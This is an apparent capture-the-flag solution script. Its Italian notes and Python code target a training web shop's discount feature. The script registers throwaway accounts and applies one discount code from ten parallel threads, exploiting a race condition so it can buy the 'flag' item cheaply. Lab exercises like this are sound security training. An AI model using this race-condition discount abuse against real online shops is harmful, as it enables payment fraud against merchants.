'''
La challenge ci chiede: "Can you get it discounted??"
Vedo che posso mettere nel cartello degli articoli e c'è scritto che ottengo la descrizione di un articolo solo dopo che l'ho acquistato.
C'è un articolo che si chiama flag quindi immagino di doverlo acquistare per ottenere la sua descrizione e quindi il flag.
Mi posso registrare come nuovo utente e ottengo solo 5€ di soldi e tutto scontato al 50%: il flag scontato del 50% ad esempio viene 5000.00€ quindi i 5€ non mi
basterebbero. Penso che debba trovare un modo per scontare il flag a 5€ in modo da poterlo acquistare.
Quando facciamo una get alla pagina /cart avviene questo:
    total = 0
    for item in cart.items:
        total += int(item.price * (100 - discount)/100)
Quindi sembra che ci sia un momento in cui il totale di tutti gli articoli nel carrello è 0 (poi dopo viene aggiornato con il prezzo
degli articoli scontato del 50%). L'idea è quindi di riuscire (una volta loggati) ad acquistare gli articoli quando sono ancora a 0€.  
NON FUNZIONA
Allora posso provare a scontare tante volte degli articoli e poi acquistare il flag scontato di molto (almeno che costi <= 5€).
NB Attenzione a non creare una sessione (come nelle altre challenges) ma a prenderla dal login.
'''

import requests
import random
import string
import threading
import time
from bs4 import BeautifulSoup

baseurl = "http://discount.training.offdef.it" 

def login(username, password):
    url = "%s/login" % baseurl
    data = {"username": username, "password": password}
    r = requests.post(url, data=data)
    print(r.cookies['session'])
    return r.cookies['session']

def register(username, password):
    url = "%s/register" % baseurl
    data = {"username": username, "password": password}
    r = requests.post(url, data=data)
    html_content = r.text
    # Parse dell'HTML con BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    # Trova il testo all'interno dell'elemento con classe "alert-warning"
    discount_code_element = soup.find('div', class_='alert-warning')
    # Estrai il testo all'interno dell'elemento
    discount_code = discount_code_element.get_text(strip=True).split(':')[-1].strip()
    # Stampa il codice sconto
    print("Codice Sconto:", discount_code)
    return discount_code

'''
def cart(session):
    url = "%s/cart" % baseurl
    r = session.get(url) 
    html_content = r.text
    # Parse del codice HTML
    soup = BeautifulSoup(html_content, 'html.parser')
    # Trova il testo all'interno dell'elemento con classe "alert-warning"
    discount_code_element = soup.find('div', class_='alert-warning')
    discount_code = discount_code_element.text.split(':')[-1].strip()
    # Stampa il codice sconto
    print("Codice Sconto:", discount_code)
    return discount_code
'''

def cartPay(session):
    url = "%s/cart/pay" % baseurl
    cookies = { 'session': session }
    r = requests.get(url, cookies=cookies)
    return r.text

def items(session):
    url = "%s/items" % baseurl
    cookies = { 'session': session }
    r = requests.get(url, cookies=cookies)
    if "flag" in r.text:
        print(r.text)
    return r.text

def apply_discount(session, discount):
    url = "%s/apply_discount" % baseurl
    data = {"discount": discount}
    cookies = { 'session': session }
    r = requests.post(url, data=data, cookies=cookies)
    return r.text

def add_to_cart(session):
    url = "%s/add_to_cart?item_id=21" % baseurl
    cookies = { 'session': session }
    r = requests.get(url, cookies=cookies)
    return r.text

def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
    
while True:    

    u = randomString()
    p = randomString()

    discount_code = register(u,p)
    s = login(u,p)
    add_to_cart(s)

    threads = []    
    
    for _ in range(10):
        thread = threading.Thread(target=apply_discount, args=(s, discount_code))
        threads.append(thread)
        thread.start()

    # Attendere che tutti i thread terminino
    for thread in threads:
        thread.join()
    
    cartPay(s)
    items(s)
    time.sleep(0.1) #se lo metto cambia poco

    





